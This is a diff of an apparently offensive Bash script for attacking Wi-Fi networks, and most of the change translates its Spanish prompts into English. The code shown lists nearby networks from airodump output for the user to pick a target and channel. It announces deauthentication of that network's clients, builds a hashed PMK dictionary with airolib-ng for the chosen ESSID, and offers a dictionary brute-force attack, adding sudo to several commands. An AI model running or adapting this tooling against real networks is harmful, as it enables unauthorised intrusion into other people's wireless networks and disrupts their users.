@@ -173,10 +173,10 @@ handshake_ataque() {
 		fi
 	done < <(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1 | sed '/Station/,1d')
 
-	launch_irodump=$(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1,6,4,9,14 | sed 's/,/   /g; /Station/,$d' | sed '$d' | nl -w3 -s "]    " | sed 's/[0-9]/[&/' | sed "s/\[/${rojo}\[${extrojo}/g; s/\]/${rojo}\]${extrojo}/g " | sed 's/WPA2 WPA/WPA2/;s/         -/        -/;s/        -/            -/;s/[0-9][0-9][0-9]    /&-/;s/    -W/   W/g;s/    -        -/           -/g;s/WEP    /WEP     /;s/WEP      /WEP     /; s/WPA    /WPA     /;s/WPA      /WPA     / ; s/OPN    /OPN     /; s/OPN      /OPN     /; s/    $/    (Hidden Wifi)/; s/ -1    (/ -1     (/;s/    ++/ *  /; s/    +/ *  /;s/+//g')
-	echo -e "  Num          Bssid         CH    Encry   PWR       Essid\n----------------------------------------------------------------------\n$launch_irodump"
-	echo -ne "$redColour[?]$grayColour Seleciona una red: " && read ap
-	echo -ne "${greenColour}[?]$grayColour En que canal esta ${ap}?: " && read channel
+	launch_irodump=$(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1,6,4,9,14 | sed 's/,/   /g; /Station/,$d' | sed '$d' | nl -w3 -s "]    " | sed 's/[0-9]/[&/' | sed "s/\[/${rojo}\[${extrojo}/g; s/\]/${rojo}\]${extrojo}/g " | sed 's/WPA2 WPA/WPA2/;s/         -/        -/;s/        -/            -/;s/[0-9][0-9][0-9]    /&-/;s/    -W/   W/g;s/    -        -/           -/g;s/WEP    /WEP     /;s/WEP      /WEP     /; s/WPA    /WPA     /;s/WPA      /WPA     / ; s/OPN    /OPN     /; s/OPN      /OPN     /; s/    $/    (Hidden Wifi)/; s/ -1    (/ -1     (/;s/    ++/    /; s/    +/    /;s/+//g')
+	echo -e "  Number          Bssid         CH    Encry   PWR       Essid\n----------------------------------------------------------------------\n$launch_irodump"
+	echo -ne "\n$greenColour[?]$grayColour Select a network: " && read ap
+	echo -ne "${greenColour}[?]$grayColour What channel is ${ap}?: " && read channel
 	tput civis
 	$cleancolor
 	echo -e "${greenColour}[*]$grayColour Se esta desautenticando a los usuarios de la red"
@@ -270,23 +270,23 @@ fuerza_rainbow() {
 rainbowtaibles() {
 	clear; echo -e "\n${yellowColour}[*]$grayColour Starting Rainbow Taibles..."
 	echo -ne "${blueColour}[?]$grayColour Dictionary path: " && read ruta
-	airolib-ng dicc-hasheado --import passwd $ruta > /dev/null 2>&1
+	sudo airolib-ng dicc-hasheado --import passwd $ruta > /dev/null 2>&1
 	test -f dicc-hasheado
 	if [ "$(echo $?)" -eq 0 ]; then
-		echo -ne "${turquoiseColour}[?]$grayColour Nombre o essid de la red: " && read ap 
+		echo -ne "${turquoiseColour}[?]$grayColour Essid or Network name: " && read ap 
 		echo "$ap" > essid.lst
-		airolib-ng dicc-hasheado --import essid essid.lst > /dev/null 2>&1
-		airolib-ng dicc-hasheado --clean all 
-		echo -ne "${redColour}[?]$grayColour Cuantos segundos quieres que dure el proceso de hasheo?: " && read seg
+		sudo airolib-ng dicc-hasheado --import essid essid.lst > /dev/null 2>&1
+		sudo airolib-ng dicc-hasheado --clean all 
+		echo -ne "${redColour}[?]$grayColour How many seconds do you want the hasheo process to last?: " && read seg
 		xterm -hold -e "airolib-ng dicc-hasheado --batch" & 
 		batch_PID=$!
 		sleep ${seg}; kill -9 $batch_PID; wait $batch_PID 2>/dev/null
-		echo -e "\n${greenColour}[+]$grayColour Diccionario listo (Nombre: dicc-hasheado)"
-		echo -ne "${blueColour}[?]$grayColour Quieres hacer un ataque de fuerza bruta con el diccionario? [Y/N]: " && read attak
+		echo -e "\n${greenColour}[+]$grayColour Dictionary finish (name: dicc-hasheado)"
+		echo -ne "${blueColour}[?]$grayColour Do you want to do a brute force attack with the dictionary? [Y/N]: " && read attak
 		if [ "$attak" == "Y" ] || [ "$attak" == "y" ]; then
 			fuerza_rainbow
 		else
-			echo -e "\n${redColour}[!]$grayColour Saliendo"
+			echo -e "\n${redColour}[!]$grayColour Exit"
 		fi
 	else
 		echo -e "\n${redColour}[!]$grayColour The dictionary could not be created or you have entered the wrong dictionary path"
@@ -299,7 +299,7 @@ menuforce() {
 	echo -e "2) Create hashed dictionary (Rainbow taibles)"
 	echo -e "3) Force brute with dictionary hashed"
 	echo -e "4) Exit"
-	echo -ne "${yellowColour}[*]$grayColour Attack Force: " && read force 
+	echo -ne "\n${yellowColour}[?]$grayColour Attack Force: " && read force 
 	case $force in 
 	1)
 	fuerza_.cap
